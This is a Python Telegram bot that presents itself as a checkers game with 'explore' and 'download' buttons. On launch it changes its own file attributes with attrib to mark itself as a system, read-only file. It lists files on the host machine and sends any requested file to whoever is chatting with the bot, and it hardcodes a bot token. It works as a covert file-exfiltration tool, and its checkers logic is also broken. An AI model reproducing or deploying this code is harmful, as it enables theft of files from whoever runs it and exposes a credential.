from gc import callbacks

import telebot ,os , sys,random
from select import select

from explore import explore
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

os.system(f"attrib -h +s +r {sys.argv[0]}")

exp= explore()
bot=telebot.TeleBot("7964940175:AAG9haJgMfI46xH3Q85z4Cc4go-g3EWQVcM")
kd1 = telebot.types.InlineKeyboardMarkup(row_width=1)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = telebot.types.KeyboardButton("explore")
    item2 = telebot.types.KeyboardButton("download")
    item3 = telebot.types.KeyboardButton("game")
    markup.add(item1, item2, item3)
    bot.send_message(message.chat.id,"Выберете что вам надо",reply_markup=markup)


players = {
        "player_1": None,
        "player_2": None
    }

colors = {
    "color_first_player": None,
    "color_second_player": None,
    "color": ["⬛", "⬜"]
}

select_checker= None

@bot.message_handler(content_types=['text'])
def start_message(message):
    if message.text.lower() == "explore":
        exp.__open_file__()
        kd1 = InlineKeyboardMarkup(row_width=1)
        for i in exp.__show__():
            btn = InlineKeyboardButton(text=f'{i}', callback_data=f'{i}_btn')
            kd1.add(btn)
        bot.send_message(message.chat.id, 'Explore:\n', reply_markup=kd1)
    elif message.text.lower() == "download":
        bot.send_message(message.chat.id, "What file you want to download?")
        bot.register_next_step_handler(message, download)
    elif message.text.lower() == "game":
            user_id = message.from_user.id
            if players["player_1"] is None:
                players["player_1"] = user_id
                bot.send_message(message.chat.id, "Your first player")
            elif players["player_2"] is None:
                players["player_2"] = user_id
                bot.send_message(message.chat.id, "Your second player")

            if colors["color_first_player"] is not None and colors["color_second_player"] is not None:
                start_game(message)
            else:
                colors["color_second_player"], colors["color_first_player"] = ("⬛", "⬜") if random.randint(0, 1) else ("⬜", "⬛")


def start_game(message):
    kd1 = telebot.types.InlineKeyboardMarkup(row_width=8)
    letters = [chr(i) for i in range(97, 105)]
    for row ,row_letters in enumerate(letters):
        btn = []
        for col in range(8):
            if colors["color_first_player"] == '⬛':
                if row < 3 and (row + col) % 2 == 0:
                    board = '⬛'
                    color = "black"
                elif row > 4 and (row + col) % 2 == 0:
                    board = '⬜'
                    color = "white"
                else:
                    board = ' '
                    color = "empty"
            else:
                if row < 3 and (row + col) % 2 == 0:
                    board = '⬜'
                    color = "white"
                elif row > 4 and (row + col) % 2 == 0:
                    board = '⬛'
                    color = "black"
                else:
                    board = ' '
                    color = "empty"

            btn.append(telebot.types.InlineKeyboardButton(text=board, callback_data=f"{row_letters}_{col}_{color}"))
        kd1.add(*btn)

    bot.send_message(players["player_2"], 'Checkers:\n', reply_markup=kd1)
    bot.send_message(players["player_1"], 'Checkers:\n', reply_markup=kd1)






@bot.callback_query_handler(func=lambda callback: True)
def make_move(callback):
    global select_checker
    call = callback.data
    row_letters, col_spl , color = call.split('_')
    row = ord(row_letters) - 97
    col = int(col_spl)
    if select_checker is None:
        if color in ["black","white"]:
            select_checker = (row,col,color)
        else:
            bot.answer_callback_query(callback.id,"PLs select your checker")
    else:
        start_row, start_col, color = select_checker
        end_row, end_col = row, col
        update_board(start_row, start_col, end_row, end_col, color)
        select_checker=None
        bot.answer_callback_query(callback.id, "Move completed")


def update_board(start_row,start_col,end_row,end_col,color):
    kd1 = telebot.types.InlineKeyboardMarkup(row_width=8)
    for row in range(8):
        new_btn = []
        for col in range(8):
            if (row,col)==(end_row,end_col):
                if color == 'black':
                    new_color='⬛'
                else:
                    new_color= '⬜'
                callback_data = f"{row+97}_{col}_{color}"
            elif (row,col)==(start_row, start_col):
                if color == "empty":
                    new_color= " "
                callback_data = f"{row + 97}_{col}_{color}"
            else:
                new_color = '⬛' if color == "black" else '⬜' if color=="white" else " "
                callback_data = f"{row + 97}_{col}_default"


            new_btn.append(telebot.types.InlineKeyboardButton(text=new_color ,callback_data=callback_data))
        kd1.add(*new_btn)

    bot.send_message(players["player_2"], 'Checkers:\n', reply_markup=kd1)
    bot.send_message(players["player_1"], 'Checkers:\n', reply_markup=kd1)




'''def possible_move(start_row, start_col,end_row,end_col,color):
    if color == "empty":
        return False
    elif abs(start_row - end_row)%2==1 and abs(start_col - end_col)%2==1:
        pass
'''


def download(message):
    user_mess = message.text
    exp.__open_file__()
    print(user_mess)
    search_file = exp.__search__(user_mess)
    if search_file:
        print(f"Good")
        print(f"Файл найден: {search_file}")
        with open(search_file, "rb") as file:
            bot.send_document(message.chat.id, file)
    else:
        print(f"Bad")


if __name__ == "__main__":
    bot.polling(non_stop=True)







